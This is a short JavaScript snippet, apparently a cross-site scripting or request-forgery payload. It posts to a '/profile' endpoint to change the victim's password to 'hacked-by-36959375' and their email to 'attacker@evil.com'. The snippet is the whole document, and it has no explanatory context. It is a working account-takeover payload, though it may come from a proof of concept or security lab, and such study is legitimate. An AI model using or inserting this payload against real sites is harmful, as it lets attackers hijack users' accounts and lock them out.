fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "password=hacked-by-36959375&email=attacker@evil.com"
});
